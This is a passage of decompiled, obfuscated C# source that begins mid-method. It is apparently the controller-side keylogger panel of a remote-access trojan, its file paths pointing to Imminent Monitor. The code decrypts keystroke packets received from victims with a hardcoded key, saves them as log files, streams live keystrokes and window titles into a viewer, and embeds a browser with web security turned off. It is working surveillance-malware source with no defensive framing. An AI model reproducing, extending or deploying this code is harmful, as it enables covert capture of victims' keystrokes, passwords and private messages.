          if (Operators.CompareString(treeNode.Text, DateAndTime.MonthName(Conversions.ToInteger(str.Split(Conversions.ToCharArrayRankOne("-"))[1])), false) == 0)
            treeNode.Nodes.Add(new TreeNode()
            {
              Text = str,
              ImageIndex = 1,
              SelectedImageIndex = 1
            });
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  public void method_6(string string_0)
  {
    this.vmethod_36().BeginUpdate();
    this.vmethod_36().Selection.BeginUpdate();
    this.vmethod_36().Text = string_0;
    this.vmethod_36().DoCaretVisible();
    this.vmethod_36().EndUpdate();
    this.vmethod_36().Selection.EndUpdate();
  }

  public void method_7(object[] object_0)
  {
    this.method_6(Encoding.UTF8.GetString(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0((byte[]) object_0[2], Encoding.UTF8.GetBytes("sampleKey"))));
    Class97.smethod_19("Key Logs", "Saved Data", this.gclass18_0.method_20().method_0(), Path.GetFileName((string) object_0[3]) + ".log", (byte[]) null, true, this.vmethod_36().Text);
  }

  public void method_8(string string_0)
  {
    this.vmethod_38().BeginUpdate();
    this.vmethod_38().Selection.BeginUpdate();
    Range range = this.vmethod_38().Selection.Clone();
    Range selection = this.vmethod_38().Selection;
    Place place1;
    if (this.vmethod_38().LinesCount <= 0)
    {
      Place place2;
      // ISSUE: explicit constructor call
      ((Place) ref place2).\u002Ector(0, 0);
      place1 = place2;
    }
    else
    {
      Place place3;
      // ISSUE: explicit constructor call
      ((Place) ref place3).\u002Ector(this.vmethod_38()[this.vmethod_38().LinesCount - 1].Count, this.vmethod_38().LinesCount - 1);
      place1 = place3;
    }
    selection.Start = place1;
    this.vmethod_38().InsertText(string_0);
    if (range.IsEmpty && range.Start.iLine <= this.vmethod_38().LinesCount - 2)
    {
      this.vmethod_38().DoCaretVisible();
    }
    else
    {
      this.vmethod_38().Selection.Start = range.Start;
      this.vmethod_38().Selection.End = range.End;
    }
    this.vmethod_38().Selection.EndUpdate();
    this.vmethod_38().EndUpdate();
  }

  public void method_9(object[] object_0)
  {
    string string_0 = (string) object_0[3];
    if ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket) object_0[2] == dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Window)
      string_0 = "\r\n\r\n" + string_0 + "\r\n\r\n";
    this.method_8(string_0);
  }

  private void method_10(object sender, EventArgs e)
  {
    TreeNode selectedNode = this.vmethod_8().SelectedNode;
    TreeNode parent = selectedNode.Parent;
    if (selectedNode == null || parent == null)
      return;
    this.method_0(this.vmethod_8().SelectedNode.Text);
  }

  private void method_11(object sender, EventArgs e)
  {
    this.method_3();
    this.vmethod_10().Enabled = true;
    this.vmethod_12().Enabled = false;
  }

  private void method_12(object sender, EventArgs e)
  {
    this.method_4();
    this.vmethod_10().Enabled = false;
    this.vmethod_12().Enabled = true;
  }

  private void method_13(object sender, EventArgs e)
  {
    this.method_1(this.vmethod_8().SelectedNode.Text);
    this.vmethod_8().SelectedNode.Remove();
    this.method_2();
  }

  private void method_14(object sender, EventArgs e) => this.method_2();

  public virtual ChromiumWebBrowser vmethod_42() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_43(ChromiumWebBrowser chromiumWebBrowser_1) => this.chromiumWebBrowser_0 = chromiumWebBrowser_1;

  [MethodImpl(MethodImplOptions.NoOptimization)]
  private void method_15()
  {
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\keylogger.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      ProjectData.EndApp();
    }
    this.vmethod_43(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_42()).AllowDrop = false;
    ((Control) this.vmethod_42()).Dock = DockStyle.Fill;
    this.Controls.Add((Control) this.vmethod_42());
    this.vmethod_42().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 2
    };
    this.vmethod_42().RegisterJsObject("keylogger", (object) new KeyloggerCefHandler(this), (BindingOptions) null);
  }

  private void method_16(object sender, TextChangedEventArgs e)
  {
    e.ChangedRange.ClearStyle(new Style[1]
    {
      (Style) this.textStyle_0
    });
    e.ChangedRange.SetStyle((Style) this.textStyle_0, "\\w(.*?)\\--]");
  }

  private void method_17(object sender, TextChangedEventArgs e)
  {
    e.ChangedRange.ClearStyle(new Style[1]
    {
      (Style) this.textStyle_0
    });
    e.ChangedRange.SetStyle((Style) this.textStyle_0, "\\w(.*?)\\--]");
  }

  private void method_18(object sender, EventArgs e) => this.vmethod_38().GoEnd();
}
